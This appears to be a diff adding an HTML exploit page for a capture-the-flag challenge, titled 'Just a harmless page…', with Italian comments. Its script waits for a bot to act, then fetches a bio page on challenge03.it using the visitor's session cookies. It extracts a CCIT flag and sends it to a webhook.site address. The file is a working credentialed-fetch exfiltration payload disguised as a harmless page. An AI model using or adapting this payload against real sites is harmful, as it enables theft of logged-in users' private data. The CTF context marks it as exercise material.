@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Just a harmless page…</title>
+</head>
+<body>
+  <h1>Loading…</h1>
+  <script>
+    // Aspetta un po’ (lasciamo tempo al bot di fare register → update_bio)
+    setTimeout(() => {
+      // Proviamo a prendere la bio (la flag viene mostrata qui)
+      fetch('https://challenge03.it/bio.php', { credentials: 'include' })
+        .then(r => r.text())
+        .then(text => {
+          // Estrae solo la parte utile (se serve, con regex)
+          const flag = text.match(/CCIT\{[^\}]+\}/)?.[0] || text;
+          // Inviala al tuo webhook
+          return fetch('https://webhook.site/75353461-3098-4b04-834f-a9f9c8e623ce?flag=' + encodeURIComponent(flag));
+        })
+        .then(() => console.log('Flag exfiltrated'))
+        .catch(console.error);
+    }, 30_000);  // 30 s ≃ register(5s) + update_bio(10s) + margine
+  </script>
+</body>
+</html>
